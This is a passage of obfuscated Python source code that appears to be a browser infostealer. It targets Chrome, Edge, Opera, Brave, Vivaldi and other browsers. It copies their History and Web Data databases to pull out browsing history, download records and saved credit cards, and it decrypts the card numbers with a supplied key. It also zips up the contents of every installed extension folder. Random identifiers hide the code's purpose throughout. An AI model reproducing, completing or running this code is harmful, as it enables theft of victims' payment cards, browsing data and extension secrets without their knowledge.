            RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_name = f"  Browser : {RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS}"
            BHSOSIMMFFHXGLUPANDELKTNNDPYJLNLTRTZFNMOSDRSXXTYQJWVH.append(f"{WQGGXVIPUQVNCFOANOBLRARCMLXJKZFRBCQUMCAWDBUBGHOKYRYQULBMUCDFXRKDWWICAORJPUTPXGUELWZ}\n{GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ}\n{YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO}\n{KGOKJFPPBAYLMGDRERSMOUJLCKXYFPGOVYUEDWBNQHXFEAKRVJWUMOXADKXEULCSGQPMF}\n{UDGNSUAOHBPSHVGHAFVHJWLQWROWGKPCPHYCATBNWGGGEJBYOMZZITODBFESLLNTTEECMMXOZEKSJCLY}\n{RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_name}\n")
            WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI += 1

        XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC.close()

    def KTFUUFVTPCZMQDSCYSXWVHHVOYNLZFXQCJGFGXJSEQHYFSQDUEKQKLNYJOIXUQMHKSFXDKNUMBZBDOJYKHFJXEJNYPJKZPEVUEZ(RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT):
        global FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK
        CGUYQIGYERFQPRXPSWBNTQNLXJXIKISBZOJJAAJVAQRVMYVXHWAHDDSJFAKMNZRPMCG = os.path.join(XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, 'History')
        if not os.path.exists(CGUYQIGYERFQPRXPSWBNTQNLXJXIKISBZOJJAAJVAQRVMYVXHWAHDDSJFAKMNZRPMCG):
            return
        
        XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC = sqlite3.connect(":memory:")
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ = sqlite3.connect(CGUYQIGYERFQPRXPSWBNTQNLXJXIKISBZOJJAAJVAQRVMYVXHWAHDDSJFAKMNZRPMCG)
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ.backup(XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC)
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ.close()
        QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN = XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC.cursor()
        QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            WQGGXVIPUQVNCFOANOBLRARCMLXJKZFRBCQUMCAWDBUBGHOKYRYQULBMUCDFXRKDWWICAORJPUTPXGUELWZ =          f"- Url     : {v4r_row[0]}"
            UATIMUJAOVXHXWPJMUQFCIKASQSRDJCCEHNDTRSJYFBKNVAITPTZHLKDNGOJUFGEFXMRJICG =        f"  Title   : {v4r_row[1]}"
            OHOXPHVWGPMRHHLYDQKZJTRPOHTFJZQZWBKHAPHSJLJFLNCNFFJTONCMMVXAF =         f"  Time    : {v4r_row[2]}"
            RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_name = f"  Browser : {RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS}"
            YYVJUYIAMXFGVSWAEYTCHNSHLIOHZFPQPBSEKXTEGYWMYQNKECLLEFPSZBFHTYHNFXXTLOAUK.append(f"{WQGGXVIPUQVNCFOANOBLRARCMLXJKZFRBCQUMCAWDBUBGHOKYRYQULBMUCDFXRKDWWICAORJPUTPXGUELWZ}\n{UATIMUJAOVXHXWPJMUQFCIKASQSRDJCCEHNDTRSJYFBKNVAITPTZHLKDNGOJUFGEFXMRJICG}\n{OHOXPHVWGPMRHHLYDQKZJTRPOHTFJZQZWBKHAPHSJLJFLNCNFFJTONCMMVXAF}\n{RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_name}\n")
            FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK += 1

        XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC.close()
    
    def GBTCLPCMBJGPDNMKXWKWSGABUPXDNYIFYFAXLIEYJWJYQYICVSRHEVYEJVRFYWOXNYNTPNFXPULIF(RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT):
        global KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF
        SSTLMXYQOMBBUUEXYSVOJKMJNIQEHPUDCLMMFJRJCJWRQERUWBZJEULBQFUNLFKOZLCDOWHSPZE = os.path.join(XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, 'History')
        if not os.path.exists(SSTLMXYQOMBBUUEXYSVOJKMJNIQEHPUDCLMMFJRJCJWRQERUWBZJEULBQFUNLFKOZLCDOWHSPZE):
            return

        XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC = sqlite3.connect(":memory:")
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ = sqlite3.connect(SSTLMXYQOMBBUUEXYSVOJKMJNIQEHPUDCLMMFJRJCJWRQERUWBZJEULBQFUNLFKOZLCDOWHSPZE)
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ.backup(XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC)
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ.close()
        QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN = XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC.cursor()
        QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN.execute('SELECT tab_url, target_path FROM downloads')
        for row in QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN.fetchall():
            if not row[0] or not row[1]:
                continue
            YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO =         f"- Path    : {row[1]}"
            WQGGXVIPUQVNCFOANOBLRARCMLXJKZFRBCQUMCAWDBUBGHOKYRYQULBMUCDFXRKDWWICAORJPUTPXGUELWZ =          f"  Url     : {row[0]}"
            RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_name = f"  Browser : {RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS}"
            VMNETNYFVUCYOYEBSVBZVAWBDWUAYOEGSMIXDZEPOGEXJTYSPYCJYWHGGGCXYZMKEOHMVCZRXJLISOGVERC.append(f"{YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO}\n{WQGGXVIPUQVNCFOANOBLRARCMLXJKZFRBCQUMCAWDBUBGHOKYRYQULBMUCDFXRKDWWICAORJPUTPXGUELWZ}\n{RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_name}\n")
            KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF += 1

        XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC.close()
    
    def JFXJJAWQKYYWYJUVWQXGUQZNVZMTSIZBSTQGZHNWDMZNGGEXYRKRZPC(RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY):
        global PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE
        YULJDKTDGCBHCLUWXSPOYXJIGWCOFFISONEEBMUQBOFPUKCGCHSXFYCLJDRWDDXDYKUQQIHWWFDSE = os.path.join(XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, 'Web Data')
        if not os.path.exists(YULJDKTDGCBHCLUWXSPOYXJIGWCOFFISONEEBMUQBOFPUKCGCHSXFYCLJDRWDDXDYKUQQIHWWFDSE):
            return

        XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC = sqlite3.connect(":memory:")
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ = sqlite3.connect(YULJDKTDGCBHCLUWXSPOYXJIGWCOFFISONEEBMUQBOFPUKCGCHSXFYCLJDRWDDXDYKUQQIHWWFDSE)
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ.backup(XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC)
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ.close()
        QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN = XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC.cursor()
        QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ =             f"- Name             : {v4r_row[0]}"
            IANZTRIWQMJHLSLWHKTIKNMRDRANFFLJVLVQFJHXRKVMEDPYGGLJ = f"  Expiration Month : {v4r_row[1]}"
            NUXEUFMCQGDUKBUKKEZXFYBTCGKWQPATUUERBRFNZYHWCTGGKPCFBXRMRLTZDQMJVSVLWTUERFEWVKWOWJPTNVHAWOLMS =  f"  Expiration Year  : {v4r_row[2]}"
            SXLRSILMXERRGJNUBFZADHJDUHCHOMVEPTBZYTJPRITWNZCBGUYIFSQRBFDJOXJXAKLNKSNR =      f"  Card Number      : {OGPEXAMMLQCTCCGKKRBMDMPUBJWXMJBVVZVRUWRAWRGQGJDKPSCORUDUAPTQHASCPOMCLZXCPCSH(v4r_row[3], XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY)}"
            TJPWITYMKHKQYQGFZBWEFOSHOPLUEIMMSJHSKQJJJLEEFMFHFHMBBVWNQYCMXGVMGWLWQGGJRTCKLXIANFEVHP =    f"  Date Modified    : {v4r_row[4]}"
            RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_name =     f"  Browser          : {RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS}"
            GWYGINKOADFBAKSNJCQHCZIPKBQSFGGCBKJNBFAWMXGFREHYVYMMLWYDYTMXKSRCEJXEURUKR.append(f"{GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ}\n{IANZTRIWQMJHLSLWHKTIKNMRDRANFFLJVLVQFJHXRKVMEDPYGGLJ}\n{NUXEUFMCQGDUKBUKKEZXFYBTCGKWQPATUUERBRFNZYHWCTGGKPCFBXRMRLTZDQMJVSVLWTUERFEWVKWOWJPTNVHAWOLMS}\n{SXLRSILMXERRGJNUBFZADHJDUHCHOMVEPTBZYTJPRITWNZCBGUYIFSQRBFDJOXJXAKLNKSNR}\n{TJPWITYMKHKQYQGFZBWEFOSHOPLUEIMMSJHSKQJJJLEEFMFHFHMBBVWNQYCMXGVMGWLWQGGJRTCKLXIANFEVHP}\n{RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_name}\n")
            PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE += 1
        
        XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC.close()

    def SQZYJURQUNRMPKYOCHOSNQUCJGGEBDOLRAGUFHHPTVBEBKAXCFACLEMWTJCSTBEFOERINBUMQDKDFULUWWZYXNYX(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI, GOUTZDDKVOIATHRMAGWCRJWJLGTOHRWUXVLBMPOVAXIMRZAZDVEXINGSCALKMOGVYYLGWSKUFHZBEFLA, RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT):
        global KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS
        GIKWLVXRNILCQZFKGRAECFTAGPGPXQFDWGLKMWNUUPLIMEPXDEYHHVRDKYVTALAAGHTFHCBIJTOTFTYKMQKIMKZWWHIZRK = os.path.join(XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, 'Extensions')
        ZVQGEYAQCHHVYZDALITRCEJPUKNWSRGURMGVOJTEOJPWBTBOOJHZWFPVHJTCFLUGSMTQHIKYXRURXQZ = os.path.join("Extensions", RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS)

        if not os.path.exists(GIKWLVXRNILCQZFKGRAECFTAGPGPXQFDWGLKMWNUUPLIMEPXDEYHHVRDKYVTALAAGHTFHCBIJTOTFTYKMQKIMKZWWHIZRK):
            return 

        MWRSBKFQERZPFNAFUKGDJSHVZGXJWSVJZPQIJRISDDQLCQCBXL = [v4r_item for v4r_item in os.listdir(GIKWLVXRNILCQZFKGRAECFTAGPGPXQFDWGLKMWNUUPLIMEPXDEYHHVRDKYVTALAAGHTFHCBIJTOTFTYKMQKIMKZWWHIZRK) if os.path.isdir(os.path.join(GIKWLVXRNILCQZFKGRAECFTAGPGPXQFDWGLKMWNUUPLIMEPXDEYHHVRDKYVTALAAGHTFHCBIJTOTFTYKMQKIMKZWWHIZRK, v4r_item))]
        
        for v4r_extention in MWRSBKFQERZPFNAFUKGDJSHVZGXJWSVJZPQIJRISDDQLCQCBXL:
            if "Temp" in v4r_extention:
                continue
            
            KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS += 1
            WXYHFCEEIXFCFKQIXEWHHLTJZECWVEWZQAETLMYQSNHAUSVTLKCQLOZDRLWEEJOAFJFEYMQAY = False
            
            for v4r_extension_name, v4r_extension_folder in GOUTZDDKVOIATHRMAGWCRJWJLGTOHRWUXVLBMPOVAXIMRZAZDVEXINGSCALKMOGVYYLGWSKUFHZBEFLA:
                if v4r_extention == v4r_extension_folder:
                    WXYHFCEEIXFCFKQIXEWHHLTJZECWVEWZQAETLMYQSNHAUSVTLKCQLOZDRLWEEJOAFJFEYMQAY = True
                    
                    FLRDBVJDQYKQTBZAACJIOBMLCWBYYYSJMVOJIXJIKWRISITGWBQUTSCKXSMDNMCFCWCKEAIUFVJZZQY = os.path.join(ZVQGEYAQCHHVYZDALITRCEJPUKNWSRGURMGVOJTEOJPWBTBOOJHZWFPVHJTCFLUGSMTQHIKYXRURXQZ, v4r_extension_name, v4r_extention)
                    
                    JVOCEGROAPXTWXFCHIGMYXTMYTAEEHFFGXKSFGKHETUWODMOZLNAYDXYSQIYIZYNMDDXWIPHFUYMSGDNVDHCQDWBRNQYG = os.path.join(GIKWLVXRNILCQZFKGRAECFTAGPGPXQFDWGLKMWNUUPLIMEPXDEYHHVRDKYVTALAAGHTFHCBIJTOTFTYKMQKIMKZWWHIZRK, v4r_extention)
                    for v4r_item in os.listdir(JVOCEGROAPXTWXFCHIGMYXTMYTAEEHFFGXKSFGKHETUWODMOZLNAYDXYSQIYIZYNMDDXWIPHFUYMSGDNVDHCQDWBRNQYG):
                        ABFJAJQHRCVOILCPTNQSKVORCYZHZOFXECTJLHBCIVKZDSUDAVHCCZLWFGQWHYGCIVNATPBTFGZKISSNWFLFGTDTGIOARRT = os.path.join(JVOCEGROAPXTWXFCHIGMYXTMYTAEEHFFGXKSFGKHETUWODMOZLNAYDXYSQIYIZYNMDDXWIPHFUYMSGDNVDHCQDWBRNQYG, v4r_item)
                        
                        if os.path.isdir(ABFJAJQHRCVOILCPTNQSKVORCYZHZOFXECTJLHBCIVKZDSUDAVHCCZLWFGQWHYGCIVNATPBTFGZKISSNWFLFGTDTGIOARRT):
                            for dirpath, dirnames, filenames in os.walk(ABFJAJQHRCVOILCPTNQSKVORCYZHZOFXECTJLHBCIVKZDSUDAVHCCZLWFGQWHYGCIVNATPBTFGZKISSNWFLFGTDTGIOARRT):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, JVOCEGROAPXTWXFCHIGMYXTMYTAEEHFFGXKSFGKHETUWODMOZLNAYDXYSQIYIZYNMDDXWIPHFUYMSGDNVDHCQDWBRNQYG)
                                    BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.write(file_path, os.path.join(FLRDBVJDQYKQTBZAACJIOBMLCWBYYYSJMVOJIXJIKWRISITGWBQUTSCKXSMDNMCFCWCKEAIUFVJZZQY, arcname))
                        else:
                            BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.write(ABFJAJQHRCVOILCPTNQSKVORCYZHZOFXECTJLHBCIVKZDSUDAVHCCZLWFGQWHYGCIVNATPBTFGZKISSNWFLFGTDTGIOARRT, os.path.join(FLRDBVJDQYKQTBZAACJIOBMLCWBYYYSJMVOJIXJIKWRISITGWBQUTSCKXSMDNMCFCWCKEAIUFVJZZQY, v4r_item))
                    break

            if not WXYHFCEEIXFCFKQIXEWHHLTJZECWVEWZQAETLMYQSNHAUSVTLKCQLOZDRLWEEJOAFJFEYMQAY:
                QZXIYVDTKOSAJDPWOORSTIOCXMVBOWELQUYFWBQXBXJGMZBRSXZMYABCCHZOYKXWSDPSLV = os.path.join(ZVQGEYAQCHHVYZDALITRCEJPUKNWSRGURMGVOJTEOJPWBTBOOJHZWFPVHJTCFLUGSMTQHIKYXRURXQZ, "Unknown Extension", v4r_extention)
                
                JVOCEGROAPXTWXFCHIGMYXTMYTAEEHFFGXKSFGKHETUWODMOZLNAYDXYSQIYIZYNMDDXWIPHFUYMSGDNVDHCQDWBRNQYG = os.path.join(GIKWLVXRNILCQZFKGRAECFTAGPGPXQFDWGLKMWNUUPLIMEPXDEYHHVRDKYVTALAAGHTFHCBIJTOTFTYKMQKIMKZWWHIZRK, v4r_extention)
                for v4r_item in os.listdir(JVOCEGROAPXTWXFCHIGMYXTMYTAEEHFFGXKSFGKHETUWODMOZLNAYDXYSQIYIZYNMDDXWIPHFUYMSGDNVDHCQDWBRNQYG):
                    ABFJAJQHRCVOILCPTNQSKVORCYZHZOFXECTJLHBCIVKZDSUDAVHCCZLWFGQWHYGCIVNATPBTFGZKISSNWFLFGTDTGIOARRT = os.path.join(JVOCEGROAPXTWXFCHIGMYXTMYTAEEHFFGXKSFGKHETUWODMOZLNAYDXYSQIYIZYNMDDXWIPHFUYMSGDNVDHCQDWBRNQYG, v4r_item)
                    
                    if os.path.isdir(ABFJAJQHRCVOILCPTNQSKVORCYZHZOFXECTJLHBCIVKZDSUDAVHCCZLWFGQWHYGCIVNATPBTFGZKISSNWFLFGTDTGIOARRT):
                        for dirpath, dirnames, filenames in os.walk(ABFJAJQHRCVOILCPTNQSKVORCYZHZOFXECTJLHBCIVKZDSUDAVHCCZLWFGQWHYGCIVNATPBTFGZKISSNWFLFGTDTGIOARRT):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, JVOCEGROAPXTWXFCHIGMYXTMYTAEEHFFGXKSFGKHETUWODMOZLNAYDXYSQIYIZYNMDDXWIPHFUYMSGDNVDHCQDWBRNQYG)
                                BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.write(file_path, os.path.join(QZXIYVDTKOSAJDPWOORSTIOCXMVBOWELQUYFWBQXBXJGMZBRSXZMYABCCHZOYKXWSDPSLV, arcname))
                    else:
                        BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.write(ABFJAJQHRCVOILCPTNQSKVORCYZHZOFXECTJLHBCIVKZDSUDAVHCCZLWFGQWHYGCIVNATPBTFGZKISSNWFLFGTDTGIOARRT, os.path.join(QZXIYVDTKOSAJDPWOORSTIOCXMVBOWELQUYFWBQXBXJGMZBRSXZMYABCCHZOYKXWSDPSLV, v4r_item))

    RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_files = [
        ("Google Chrome",          os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
        ("Google Chrome Beta",     os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Kometa", "User Data"),                           "kometa.exe"),
